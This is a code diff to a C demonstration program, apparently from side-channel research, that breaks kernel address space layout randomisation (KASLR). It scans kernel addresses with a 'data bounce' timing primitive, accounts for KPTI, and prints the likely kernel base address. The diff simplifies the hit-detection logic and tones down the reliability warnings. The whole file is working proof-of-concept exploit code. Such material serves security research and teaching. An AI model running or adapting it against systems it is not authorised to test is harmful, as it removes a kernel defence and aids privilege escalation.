@@ -16,7 +16,7 @@
 #endif
 
 #define ADDRESS_RANGE_START (void*) 0xffffffff80000000ull
-#define REPS 5000
+#define REPS 500
 
 
 int main() {
@@ -29,21 +29,16 @@ int main() {
     uint8_t *mem = aligned_alloc(page_size, page_size * 256);
     memset(mem, 0xFF, page_size * 256);
     fallout_init();
-    printf("Demo 4: Breaking KASLR (without access to /proc/kallsyms)\nNote that this demo does not always produce reliable results. To be sure that the results are correct, compare them with the correct base address found by ./demo_kalsr, or run this demo multiple times.\n");
+    printf("Demo 4: Breaking KASLR (without access to /proc/kallsyms)\n");
     uint64_t delta = 0, kpti_offset = 0;
-    int hit_threshold = data_bounce(mem, addr + delta, REPS) + 4;
     char *loading = "-\\|/";
     while (1) {
         printf("[%p... %c]                     \r", addr + delta + kpti_offset, loading[(delta / KASLR_ALIGNMENT) % 4]);
         fflush(stdout);
-        int hits = data_bounce(mem, addr + delta + kpti_offset, REPS);
-        if (hits >= hit_threshold) {
-            if (hits > hit_threshold * 1.5) {
-                if(!kpti_offset) printf("An unusual amount of hits was detected at %p, so it is likely your kernel's base address\n", addr + delta + kpti_offset);
-                else printf("An unusual amount of hits was detected at %p (meaning that your kernel's base address is likely %p).\nThis happened despite KPTI being enabled on your system!\n", addr+delta+kpti_offset, addr+delta);
-                break;
-            }
-            hit_threshold = hits;
+        if (data_bounce(mem, addr + delta + kpti_offset, REPS)) {
+            if(!kpti_offset) printf("An unusual amount of hits was detected at %p, so it is likely your kernel's base address\n", addr + delta + kpti_offset);
+            else printf("An unusual amount of hits was detected at %p (meaning that your kernel's base address is likely %p).\nThis happened despite KPTI being enabled on your system!\n", addr+delta+kpti_offset, addr+delta);
+            break;
         }
         if(!kpti_offset) kpti_offset = KPTI_MAPPED_PAGE_OFFSET;
         else {
@@ -52,7 +47,7 @@ int main() {
         }
         if (delta > UINT64_MAX - (uint64_t)addr){
             printf("There was no significant increase in data bounce hits anywhere in the kernel's memory region, so KASLR was not broken.\n");
-            printf("Note that this method tends to be unreliable, so restarting the demo might yield different results.\n");
+            printf("Note that this method can be unreliable at times, so restarting the demo might yield different results.\n");
             break;
         }
     }
